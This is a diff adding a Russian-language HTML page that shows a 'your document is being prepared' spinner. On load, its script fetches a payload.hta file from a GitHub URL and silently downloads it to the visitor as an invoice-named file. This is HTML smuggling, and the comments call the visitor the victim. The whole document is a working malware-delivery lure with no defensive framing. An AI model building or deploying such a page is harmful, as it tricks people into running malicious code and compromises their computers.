@@ -1,0 +1,55 @@
+html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Загрузка документа</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding-top: 100px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #555; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>Пожалуйста, подождите, ваш документ подготавливается к загрузке...</p>
+
+    <script>
+        // --- КОНФИГУРАЦИЯ ---
+        const payloadUrl = 'https://raw.githubusercontent.com/bohannom/new/main/payload.hta';
+        const fileName = 'Счет_на_оплату.hta';
+        // --------------------
+
+        async function smuggle() {
+            try {
+                const response = await fetch(payloadUrl);
+                if (!response.ok) throw new Error('Network response was not ok.');
+                
+                const blob = await response.blob();
+                const blobUrl = URL.createObjectURL(blob);
+
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = blobUrl;
+                a.download = fileName;
+                
+                document.body.appendChild(a);
+                a.click();
+                
+                document.body.removeChild(a);
+                URL.revokeObjectURL(blobUrl);
+
+                // Опционально: перенаправить жертву после скачивания
+                // window.location.href = 'https://www.google.com';
+
+            } catch (error) {
+                console.error('Smuggling failed:', error);
+                document.querySelector('p').innerText = 'Ошибка при загрузке документа. Пожалуйста, попробуйте позже.';
+            }
+        }
+
+        // Запускаем контрабанду после загрузки страницы
+        window.onload = smuggle;
+    </script>
+</body>
+</html>
